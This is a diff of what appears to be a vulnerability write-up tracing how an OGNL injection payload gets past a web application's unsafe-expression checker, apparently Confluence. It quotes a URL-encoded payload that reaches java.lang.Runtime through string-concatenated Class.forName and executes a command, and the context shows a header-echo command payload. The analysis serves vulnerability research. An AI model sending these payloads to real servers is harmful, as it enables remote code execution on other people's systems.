@@ -127,6 +127,65 @@ ASTAssign: #a = @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRu
 ASTStaticMethod: @com.opensymphony.webwork.ServletActionContext@getResponse()
 ASTMethod: setHeader("X-Cmd-Response", #a)
 ```
-Now you can guess why it doesn't work, because `ASTAssign` is in `UNSAFE_NODE_TYPES` so `containsUnsafeExpression` return true and we cannot get our expression evaluated 
 
+You can guess why it doesn't work, because `ASTAssign` is in `UNSAFE_NODE_TYPES` so `containsUnsafeExpression` return true and we cannot get our expression evaluated 
 
+Going back to our payload that we sent in the beginning:
+```
+%24%7b%22%22%20%2b%20Class.forName(%22java.%22%20%2b%20%22lang.Runtime%22).getMethod(%22getRuntime%22%2c%20null).invoke(null%2cnull).exec(%22gnome-calculator%22)%7d%7d/
+```
+
+After the first loop, we end up in with `i=1` with our current values:
+
+![image](https://user-images.githubusercontent.com/37280106/172659455-e6d99a9b-3c46-4712-87bf-207833c3d02b.png)
+
+We are calling `this.containsUnsafeExpression(childNode, visitedExpressions)` where:
+```
+childNode: forName("java.lang.Runtime")
+```
+
+In the next `containsUnsafeExpression` 's loop, we got this value
+![image](https://user-images.githubusercontent.com/37280106/172665189-68357b0b-e670-4dba-a585-39dc1d85720b.png)
+
+Here we are calling `containsUnsafeExpression` again, with values:
+```
+childNode: java.lang.Runtime
+```
+
+![image](https://user-images.githubusercontent.com/37280106/172667092-8540bce3-68f5-4d65-96f9-4adc8ac484a1.png)
+
+In this call, our node type is `ASTConst`, so in this line of code:
+```
+String nodeClassName = node.getClass().getName(); 
+
+=> nodeClassName will be ognl.ASTConst
+```
+
+Follow the code flow, in line 117, we will move to this `else if block`;
+```java
+else if ("ognl.ASTConst".equals(nodeClassName) && !this.isSafeConstantExpressionNode(node, visitedExpressions)) {
+       return true;
+ }
+```
+
+Content of `this.isSafeConstantExpressionNode`:
+```java
+private boolean isSafeConstantExpressionNode(Node node, Set<String> visitedExpressions) {
+        try {
+            String value = node.getValue(new OgnlContext(), (Object)null).toString();
+            if (!visitedExpressions.contains(value) && value != null && !value.isEmpty()) {
+                visitedExpressions.add(value);
+                return this.isSafeExpressionInternal(value, visitedExpressions);
+            } else {
+                return true;
+            }
+        } catch (OgnlException var4) {
+            log.debug("Cannot verify safety of OGNL expression", var4);
+            return true;
+        }
+    }
+```
+
+In `this.isSafeConstantExpressionNode` , it will call `this.isSafeExpressionInternal(value, visitedExpression)` where:
+- `value: java.lang.Runtime`
+- `visitedExpression<Hashset>: {"java.lang.Runtime", "Class"}` 
